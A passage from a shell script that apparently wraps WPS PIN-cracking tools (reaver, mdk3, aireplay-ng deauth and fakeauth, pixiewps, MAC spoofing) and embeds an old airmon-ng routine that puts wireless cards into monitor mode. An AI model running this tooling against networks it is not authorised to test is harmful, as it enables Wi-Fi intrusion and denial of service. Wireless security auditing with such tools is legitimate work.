cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "PAUSE=")) {print " " $1 "\t" "router recovery and wash scan in sec(Stage IV)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "REAVER_COUNT=")) {print " " $1 "\t" "reaver countdown timer activation(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MDK3_COUNT=")) {print " " $1 "\t" "mdk3 countdown timer activation(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "WASH_COUNT=")) {print " " $1 "\t" "washscan countdown timer activation(Stage IV)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "DAMP_MDK=")) {print " " $1 "\t" "suppress mdk3 if router has not recovered(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "ADVAN_TIME=")) {print " " $1 "\t" "reaver prescan for router activity(Stage I)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_AIRE1=")) {print " " $1 "\t" "use of aireplay-ng --fakeauth during stage(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_AIRE0=")) {print " " $1 "\t" "use of aireplay-ng --deauth during(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_DHSMALL=")) {print " " $1 "\t" "use --dhsmall with reaver see comments pixiedust(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MACSEL=")) {print " " $1  "\t" "assign specific mac address(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "ASSIGN_MAC=")) {print " " $1 "\t" "assigned mac address if MACSEL=y/Y(Stage I)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_PIXIE=")) {print " " $1 "\t" "use pixiewps during wash scan(Stage IV)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_FIRSTPIN=")) {print " " $1 "\t" "check pin 12345670(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "RETESTPIN=")) {print " " $1 "\t" "Frequency to recheck pin 12345670(Stage I/II)"}}'
}

#~~~~~~~~~~~~~End config dropdown End~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~~~~start  airmon-ng old  start~~~~~~~~~~~~~~~~~#

airmon-old_fn()

{
#!/bin/sh

USERID=""
IFACE=""
KISMET=/etc/kismet/kismet.conf
CH=$3; [ x$3 = "x" ] && CH=10
IFACE_FOUND="false"
MADWIFI=0
MAC80211=0
USE_IW=0
IW_SOURCE="http://wireless.kernel.org/download/iw/iw-0.9.15.tar.bz2"
IW_ERROR=""
UDEV_ISSUE=0

if [ -f "`which iw 2>&1`" ]
then
	USE_IW=1
fi

if [ "x$MON_PREFIX"="x" ]
then
MON_PREFIX="mon"
fi

PROCESSES="wpa_action\|wpa_supplicant\|wpa_cli\|dhclient\|ifplugd\|dhcdbd\|dhcpcd\|NetworkManager\|knetworkmanager\|avahi-autoipd\|avahi-daemon\|wlassistant\|wifibox"
PS_ERROR="invalid"

usage() {
	printf "usage: `basename $0` <start|stop|check> <interface> [channel or frequency]\n"
	echo
	exit
}

startStdIface() {
	iwconfig $1 mode monitor >/dev/null 2>&1
	if [ ! -z $2 ]
	then
	    if [ $2 -lt 1000 ]
	    then
		iwconfig $1 channel $2 >/dev/null 2>&1
	    else
		iwconfig $1 freq "$2"000000 > /dev/null 2>&1
	    fi
	fi
	iwconfig $1 key off >/dev/null 2>&1
	ifconfig $1 up
	printf " (monitor mode enabled)"
}


stopStdIface() {
	ifconfig $1 down >/dev/null 2>&1
	iwconfig $1 mode Managed >/dev/null 2>&1
	ifconfig $1 down >/dev/null 2>&1
	printf " (monitor mode disabled)"
}

getModule() {
    if [ -f "/sys/class/net/$1/device/driver/module/srcversion" ]
    then
        srcver1=`cat "/sys/class/net/$1/device/driver/module/srcversion"`
        for j in `lsmod | awk '{print $1}' | grep -v "^Module$"`
        do
            srcver2="`modinfo $j 2>/dev/null | grep srcversion | awk '{print $2}'`"
            if [ $srcver1 = "$srcver2" ]
            then
                MODULE=$j
                break
            fi
        done
    else
        MODULE=""
    fi
#    return 0
}

getDriver() {
   if [ -e "/sys/class/net/$1/device/driver" ]
   then
       DRIVER="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
       BUS="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)\/.*\/.*$/\1/'`"
   else
       DRIVER=""
       BUS=""
   fi
   if [ x$(echo $DRIVER | grep ath5k) != "x" ]
   then
       DRIVER="ath5k"
   fi
   if [ x$(echo $DRIVER | grep ath9k) != "x" ]
   then
       DRIVER="ath9k"
   fi
}

scanProcesses() {
    match=`ps -A -o comm= | grep $PROCESSES | grep -v grep | wc -l`
    if [ $match -gt 0 -a x"$1" != xkill ]
    then
        printf "\n\n"
        echo "Found $match processes that could cause trouble."
        echo "If airodump-ng, aireplay-ng or airtun-ng stops working after"
        echo "a short period of time, you may want to kill (some of) them!"
        echo -e "\nPID\tName"
    else
        if [ x"$1" != xkill ]
        then
            return
        fi
    fi

    if [ $match -gt 0 -a x"$1" = xkill ]
    then
        echo "Killing all those processes..."
    fi

    i=1
    while [ $i -le $match ]
    do
        pid=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $1}'`
        pname=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $2}'`
        if [ x"$1" != xkill ]
        then
            printf "$pid\t$pname\n"
        else
            kill $pid
        fi
        i=$(($i+1))
    done
}

checkProcessesIface() {
    if [ x"$1" = x ]
    then
        return
    fi

    match2=`ps -o comm= -p 1 2>&1 | grep $PS_ERROR | grep -v grep | wc -l`
    if [ $match2 -gt 0 ]
    then
	return
    fi

    for i in `ps auxw | grep $1 | grep -v "grep" | grep -v "airmon-ng" | awk '{print $2}'`
    do
        pname=`ps -o comm= -p $i`
        echo "Process with PID $i ($pname) is running on interface $1"
    done
}

getStack() {
    if [ x"$1" = x ]
    then
        return
    fi

    if [ -d /sys/class/net/$1/phy80211/ ]
    then
        MAC80211=1
    else
        MAC80211=0
    fi
}

#you need to run getDriver $iface prior to getChipset
getChipset() {
    if [ x"$1" = x ]
    then
        return
    fi

    CHIPSET="Unknown "

    if [ x$DRIVER = "xOtus" -o x$DRIVER = "xarusb_lnx" -o x$DRIVER = "xar9170" ]
    then
	CHIPSET="AR9001U"
    fi

    if [ x$DRIVER = "xzd1211rw" -o x$DRIVER = "xzd1211rw_mac80211" ]
    then
        CHIPSET="ZyDAS 1211"
    fi

    if [ x$DRIVER = "xacx" -o x$DRIVER = "xacx-mac80211" -o x$DRIVER = "xacx1xx" ]
    then
        CHIPSET="TI ACX1xx"
    fi

    if [ x$DRIVER = "adm8211" ]
    then
        CHIPSET="ADMtek 8211"
    fi

    if [ x$DRIVER = "xat76_usb" ]
    then
        CHIPSET="Atmel   "
    fi

    if [ x$DRIVER = "xb43" -o x$DRIVER = "xb43legacy" -o x$DRIVER = "xbcm43xx" ]
    then
        CHIPSET="Broadcom"
    fi

    if [ x$DRIVER = "xprism54" -o x$DRIVER = "xp54pci" -o x$DRIVER = "xp54usb" ]
    then
        CHIPSET="PrismGT "
    fi

    if [ x$DRIVER = "xhostap" ]
    then
        CHIPSET="Prism 2/2.5/3"
    fi

    if [ x$DRIVER = "xr8180" -o x$DRIVER = "xrtl8180" ]
    then
        CHIPSET="RTL8180/RTL8185"
    fi

    if [ x$DRIVER = "xr8187" -o x$DRIVER = "xrtl8187" ]
    then
        CHIPSET="RTL8187 "
    fi

    if [ x$DRIVER = "xrt2570" -o x$DRIVER = "xrt2500usb" ]
    then
        CHIPSET="Ralink 2570 USB"
    fi

    if [ x$DRIVER = "xrt2400" -o x$DRIVER = "xrt2400pci" ]
    then
        CHIPSET="Ralink 2400 PCI"
    fi

    if [ x$DRIVER = "xrt2500" -o x$DRIVER = "xrt2500pci" ]
    then
        CHIPSET="Ralink 2560 PCI"
    fi

    if [ x$DRIVER = "xrt61" -o x$DRIVER = "xrt61pci" ]
    then
        CHIPSET="Ralink 2561 PCI"
    fi

    if [ x$DRIVER = "xrt73" -o x$DRIVER = "xrt73usb" ]
    then
        CHIPSET="Ralink 2573 USB"
    fi

    if [ x$DRIVER = "xipw2100" ]
    then
        CHIPSET="Intel 2100B"
    fi

    if [ x$DRIVER = "xipw2200" ]
    then
        CHIPSET="Intel 2200BG"
    fi

    if [ x$DRIVER = "xipw3945" -o x$DRIVER = "xipwraw" -o x$DRIVER = "xiwl3945" ]
    then
        CHIPSET="Intel 3945ABG"
    fi

    if [ x$DRIVER = "xipw4965" -o x$DRIVER = "xiwl4965" ]
    then
        CHIPSET="Intel 4965AGN"
    fi

    if [ x$DRIVER = "xiwlagn" ]
    then
        CHIPSET="Intel 4965/5xxx"
    fi

    if [ x$DRIVER = "xath_pci" -o x$DRIVER = "xath5k" -o x$DRIVER = "xath9k" ]
    then
        CHIPSET="Atheros "
    fi

    if [ x$DRIVER = "xorinoco" ]
    then
        CHIPSET="Hermes/Prism"
    fi
}

getPhy() {
    PHYDEV=""
    if [ x"$1" = x ]
    then
        return
    fi

    if [ x$MAC80211 = "x" ]
    then
        return
    fi

    PHYDEV="`ls -l "/sys/class/net/$1/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
}

getNewMon() {
    i=0

    while [ -d /sys/class/net/$MON_PREFIX$i/ ]
    do
        i=$(($i+1))
    done

    MONDEV="$MON_PREFIX$i"
}

if [ x"`which id 2> /dev/null`" != "x" ]
then
	USERID="`id -u 2> /dev/null`"
fi

if [ x$USERID = "x" -a x$UID != "x" ]
then
	USERID=$UID
fi

if [ x$USERID != "x" -a x$USERID != "x0" ]
then
	echo Run it as root ; exit ;
fi

iwpriv > /dev/null 2> /dev/null ||
  { echo Wireless tools not found ; exit ; }

if [ x"$1" = xcheck ] || [ x"$1" = xstart ]
then
    scanProcesses
    for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
    do
#         getModule $iface
#         getDriver $iface
        checkProcessesIface $iface
    done

    if [ x"$2" = xkill ]
    then
        scanProcesses "$2"
    fi
    if [ x"$1" = xcheck ]
    then
        exit
    fi
fi

printf "\n\n"

if [ $# -ne "0" ]
then
    if [ x$1 != "xstart" ] && [ x$1 != "xstop" ]
    then
        usage
    fi

    if [ x$2 = "x" ]
    then
        usage
    fi
fi

SYSFS=0
if [ -d /sys/ ]
then
    SYSFS=1
fi

printf "Interface\tChipset\t\tDriver\n\n"


for iface in `ifconfig -a 2>/dev/null | egrep UNSPEC | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/'`
do

 if [ x"`iwpriv $iface 2>/dev/null | grep ipwraw-ng`" != "x" ]
 then
        printf "$iface\t\tIntel 3945ABG\tipwraw-ng"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
        then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_abg" >>$KISMET
                startStdIface $iface $CH
                iwconfig $iface rate 1M 2> /dev/null >/dev/null
                iwconfig $iface txpower 16 2> /dev/null >/dev/null
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
        then
                stopStdIface $iface
                iwconfig $iface txpower 15 2> /dev/null >/dev/null
                iwconfig $iface rate 54M 2> /dev/null >/dev/null
        fi
        echo
        continue
 fi

 if [ -e "/proc/sys/dev/$iface/fftxqmin" ]
 then
    MADWIFI=1
    ifconfig $iface up
    printf "$iface\t\tAtheros\t\tmadwifi-ng"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        IFACE=`wlanconfig ath create wlandev $iface wlanmode monitor -bssid | grep ath`
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=madwifi_g,$iface,Atheros" >>$KISMET
        ifconfig $iface up 2>/dev/null >/dev/null
        if [ $CH -lt 1000 ]
        then
            iwconfig $IFACE channel $CH 2>/dev/null >/dev/null
        else
            iwconfig $IFACE freq "$CH"000000 2>/dev/null >/dev/null
        fi
        ifconfig $IFACE up 2>/dev/null >/dev/null
        UDEV_ISSUE=$?
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
            echo "$iface does not support 'stop', do it on ath interface"
    fi
    echo
    continue
 fi
done

if [ $MADWIFI -eq 1 ]
then
	sleep 1s
fi

for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
do
 getModule  $iface
 getDriver  $iface
 getStack   $iface
 getChipset $DRIVER


 if [ x$MAC80211 = "x1" ]
 then
    getPhy $iface
    getNewMon
    printf "$iface\t\t$CHIPSET\t$DRIVER - [$PHYDEV]"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        if [ $USE_IW = 1 ]
        then
            IW_ERROR=`iw dev $iface interface add $MONDEV type monitor 2>&1 | grep "nl80211 not found"`
            if [ x$IW_ERROR = "x" ]
            then
                sleep 1s
		if [ ! -z $3 ]
                then
            	    if [ $3 -lt 1000 ]
            	    then
                	iwconfig $MONDEV channel $3 >/dev/null 2>&1
            	    else
                	iwconfig $MONDEV freq "$3"000000 >/dev/null 2>&1
            	    fi
            	fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
                then
                    echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                    sleep 1s
                    if [ $3 -lt 1000 ]
                    then
                        iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                    else
                        iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                    fi
                    ifconfig $MONDEV up
                    printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
                else
                    printf "\n\nERROR: nl80211 support is disabled in your kernel.\nPlease recompile your kernel with nl80211 support enabled.\n"
                fi
            fi
        else
            if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
            then
                echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                sleep 1s
                if [ $3 -lt 1000 ]
                then
                    iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                else
                    iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
            else
                printf "\n\nERROR: Neither the sysfs interface links nor the iw command is available.\nPlease download and install iw from\n$IW_SOURCE\n"
            fi
        fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        z="`echo $iface | cut -b -${#MON_PREFIX}`"
        if [ x$z = "x$MON_PREFIX" ]
        then
            if [ $USE_IW = 1 ]
            then
                IW_ERROR=`iw dev "$iface" interface del 2>&1 | grep "nl80211 not found"`
                if [ x$IW_ERROR = "x" ]
                then
                    printf " (removed)"
                else
                    if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                    then
                        echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                        printf " (removed)"
                    else
                        printf "\n\nERROR: nl80211 support is disabled in your kernel.\nPlease recompile your kernel with nl80211 support enabled.\n"
                fi
                fi
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                then
                    echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                    printf " (removed)"
                else
                    printf "\n\nERROR: Neither the sysfs interface links nor the iw command is available.\nPlease download and install iw from\n$IW_SOURCE\n"
                fi
	    fi
        else
            ifconfig $iface down
            iwconfig $iface mode managed
            printf "\n\t\t\t\t(monitor mode disabled)"
        fi
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xorinoco" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_rid`" != "x" ] || [ x"`iwpriv $iface 2>/dev/null | grep dump_recs`" != "x" ]
 then
    printf "$iface\t\tHermesI\t\torinoco"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=orinoco,$iface,HermesI" >>$KISMET
        if [ $CH -lt 1000 ]
        then
            iwconfig $iface mode Monitor channel $CH >/dev/null 2>&1
        else
            iwconfig $iface mode Monitor freq "$CH"000000 >/dev/null 2>&1
        fi
        iwpriv $iface monitor 1 $CH >/dev/null 2>&1
        ifconfig $iface up
        printf " (monitor mode enabled)"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        ifconfig $iface down
        iwpriv $iface monitor 0 >/dev/null 2>&1
        iwconfig $iface mode Managed >/dev/null 2>&1
        printf " (monitor mode disabled)"
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xipw2100" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_crc_check`" != "x" ]
 then
    printf "$iface\t\tIntel 2100B\tipw2100"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=ipw2100,$iface,Centrino_b" >>$KISMET
        startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        stopStdIface $iface
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xarusb_lnx" ] || [ x$DRIVER = "Otus" ]
 then
    printf "$iface\t\tAR9001USB\tOtus"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
	echo "Monitor mode not yet supported"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
	stopStdIface $iface
    fi
    echo
    continue
 fi  

 if [ x$DRIVER = "xipw2200" ] || [ x"`iwpriv $iface 2>/dev/null | grep sw_reset`" != "x" ]
 then
    MODINFO=`modinfo ipw2200  2>/dev/null | awk '/^version/ {print $2}'`
    if { echo "$MODINFO" | grep -E '^1\.0\.(0|1|2|3)$' ; }
    then
    	echo "Monitor mode not supported, please upgrade"
    else
	printf "$iface\t\tIntel 2200BG\tipw2200"
	if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
	then
	    cp $KISMET~ $KISMET 2>/dev/null &&
	    echo "source=ipw2200,$iface,Centrino_g" >>$KISMET
	    startStdIface $iface $CH
	fi
	if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
	then
	    stopStdIface $iface
	fi

    	if { echo "$MODINFO" | grep -E '^1\.0\.(5|7|8|11)$' ; }
	then
		printf " (Warning: bad module version, you should upgrade)"
	fi
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xcx3110x" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_backscan`" != "x" ]
 then
     printf "$iface\t\tNokia 770\t\tcx3110x"
     if [ x$1 = "xstart" ] || [ x$1 = "xstop" ]
     then
     	printf " (Enable/disable monitor mode not yet supported)"
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xipw3945" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_preamble | grep -v set_crc_check`" != "x" ]
  then
        printf "$iface\t\tIntel 3945ABG\tipw3945"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
         then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_g" >>$KISMET
                startStdIface $iface $CH
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
         then
                stopStdIface $iface
        fi
        echo
        continue
 fi


 if [ x"`iwpriv $iface 2>/dev/null | grep inact_auth`" != "x" ]
 then
     if [ -e "/proc/sys/net/$iface/%parent" ]
     then
        printf "$iface\t\tAtheros\t\tmadwifi-ng VAP (parent: `cat /proc/sys/net/$iface/%parent`)"
	if [ x$2 = x$iface ] && [ x$1 = "xstop" ]
	then
		wlanconfig $iface destroy
		printf " (VAP destroyed)"
	fi
	if [ x$1 = "xstart" ]
	then
		if [ $iface = "$IFACE" ]
		then
			printf " (monitor mode enabled)"
		fi
		if [ x$2 = x$iface ]
		then
			printf " (VAP cannot be put in monitor mode)"
		fi
	fi

	echo ""
        continue

     fi
     printf "$iface\t\tAtheros\t\tmadwifi"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=madwifi_g,$iface,Atheros" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xprism54" ] || [ x"`iwpriv $iface 2>/dev/null | grep getPolicy`" != "x" ]
 then
     printf "$iface\t\tPrismGT\t\tprism54"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=prism54g,$iface,Prism54" >>$KISMET
         ifconfig $iface up
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface set_prismhdr 1 >/dev/null 2>&1
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xhostap" ] || [ x"`iwpriv $iface 2>/dev/null | grep antsel_rx`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\tHostAP"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=hostap,$iface,Prism2" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface monitor_type 1 >/dev/null 2>&1
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xwlan-ng" ] || [ x"`wlancfg show $iface 2>/dev/null | grep p2CnfWEPFlags`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\twlan-ng"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=wlanng,$iface,Prism2" >>$KISMET
         wlanctl-ng $iface lnxreq_ifstate ifstate=enable >/dev/null
         wlanctl-ng $iface lnxreq_wlansniff enable=true channel=$CH \
                           prismheader=true wlanheader=false \
                           stripfcs=true keepwepflags=true >/dev/null
         echo p2CnfWEPFlags=0,4,7 | wlancfg set $iface
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         ifconfig $iface down
         wlanctl-ng $iface lnxreq_wlansniff enable=false  >/dev/null
         wlanctl-ng $iface lnxreq_ifstate ifstate=disable >/dev/null
         printf " (monitor mode disabled)"
     fi
     echo
     continue
 fi


 if [ x$SYSFS = "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" != "x" ]
 then
    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt61`" != "x" ]
    then
    	printf "$iface\t\tRalink 2561 PCI\trt61"
    fi

    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt73`" != "x" ]
    then
        printf "$iface\t\tRalink 2573 USB\trt73"
    fi

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi
    echo
    continue

 fi


 if [ x$DRIVER = "xrt61" ]
 then
    printf "$iface\t\tRalink 2561 PCI\trt61"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt73" ]
 then
    printf "$iface\t\tRalink 2573 USB\trt73"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt2500" ] || [ x"`iwpriv $iface 2>/dev/null | grep bbp`" != "x" ]
 then
     printf "$iface\t\tRalink 2560 PCI\trt2500"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xrt2570" ] || [ x"`iwpriv $iface 2>/dev/null | grep wpapsk`" != "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" = "x" ]
 then
     printf "$iface\t\tRalink 2570 USB\trt2570"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8180" ] || [ x"`iwpriv $iface 2>/dev/null | grep debugtx`" != "x" ]
 then
     printf "$iface\t\tRTL8180/RTL8185\tr8180"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep prismhdr`" != "x" ]
         then
            iwpriv $iface prismhdr 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8187" ] || [ x"`iwpriv $iface 2>/dev/null | grep badcrc`" != "x" ]
 then
     printf "$iface\t\tRTL8187\t\tr8187"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep rawtx`" != "x" ]
         then
             iwpriv $iface rawtx 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211rw" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_regdomain`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211rw"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211" ] || [ x"`iwpriv $iface 2>/dev/null | grep dbg_flag`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
